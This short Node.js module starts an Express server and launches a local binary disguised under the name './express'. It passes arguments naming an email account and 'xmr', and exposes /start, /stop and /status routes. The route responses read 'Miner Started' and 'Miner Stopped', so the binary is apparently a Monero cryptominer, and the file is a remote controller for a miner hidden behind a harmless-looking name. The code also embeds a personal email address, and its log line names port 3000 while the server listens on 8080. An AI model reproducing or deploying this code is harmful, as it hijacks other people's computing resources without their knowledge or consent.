exports.worker = function() {
const { spawn } = require('child_process');
const express = require('express');
const app = express();
var state = true;
var proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);



app.listen(8080, ()=>{
  console.log('Example app listening on port 3000!');
});
app.get('/stop', function (req, res) {
  	res.send('Miner Stopped');
		proc.kill('SIGINT');
});
app.get('/status', function (req, res) {
  	res.send(state);
});

const start = ()=>{
    state = true;
    proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
    proc.on('close', () => {
      console.log('child process exited');
      state = false;
    });
}

app.get('/start',  (req,res)=>{
    state = true;
    start();
    res.send('Miner Started');
});
};
